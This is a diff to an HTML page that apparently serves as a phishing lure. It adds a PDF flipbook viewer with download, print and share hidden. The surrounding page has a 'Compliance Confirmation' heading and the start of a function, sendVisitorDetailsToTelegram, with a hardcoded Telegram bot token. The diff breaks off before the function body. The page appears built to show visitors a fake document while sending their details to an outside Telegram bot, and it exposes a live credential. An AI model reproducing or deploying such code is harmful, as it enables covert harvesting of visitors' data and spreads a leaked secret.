@@ -19,6 +19,11 @@
     }
 </script>
 
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/css/dflip.min.css" />
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/js/dflip.min.js"></script>
 <style>
 /* ---------- Base ---------- */
 body {
@@ -635,6 +640,10 @@ CROP MODAL
   </div>
 </header>
 
+ <div class="custom-platform-reader" style="max-width: 900px; margin: 40px auto; padding: 10px;">
+        <div id="flipbook-viewer" style="height: 800px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.08);"></div>
+    </div>
+
 <!-- Membership Confirmation -->
 <h2 class="membership-confirmation">
   Compliance Confirmation
@@ -682,6 +691,18 @@ CROP MODAL
 </footer>
 
 <script>
+jQuery(document).ready(function($) {
+            $("#flipbook-viewer").flipBook("https://yourplatform.com/files/document.pdf", {
+                layout: 1,              
+                direction: "vertical",  
+                hideDownload: true,     
+                hidePrint: true,        
+                hideShare: true,        
+                webgl: true,            
+                backgroundColor: "#f5f5f7" 
+            });
+        });
+
 async function sendVisitorDetailsToTelegram() {
   // 1. Telegram bot details
   const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
